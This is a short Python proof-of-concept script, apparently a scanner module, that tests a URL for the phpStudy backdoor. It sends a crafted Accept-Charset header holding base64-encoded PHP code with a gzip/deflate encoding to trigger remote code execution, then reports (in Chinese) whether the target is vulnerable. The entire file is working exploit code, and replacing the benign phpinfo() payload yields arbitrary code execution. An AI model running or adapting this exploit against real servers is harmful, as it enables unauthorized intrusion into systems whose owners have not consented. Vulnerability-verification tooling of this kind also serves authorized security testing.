import requests
from termcolor import cprint

class phpstudy_backdoor_BaseVerify():
    def __init__(self,url):
        self.url = url

    def run(self):
        poc = {
                "Accept-Charset": "cGhwaW5mbygpOw==",
                "Accept-Encoding": "gzip,deflate"
            }
        try:
            pocRequest = requests.get(self.url, headers=poc,timeout=3)
            if "phpinfo" in str(pocRequest.content):
                cprint("[+]存在phpstudy_backdoor漏洞\tpayload: "+self.url, "green")
                return True
            else:
                cprint("[-]不存在phpstudy_backdoor漏洞", "white", "on_grey")
        except :
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    test=phpstudy_backdoor_BaseVerify('http://192.168.5.8')
    test.run()

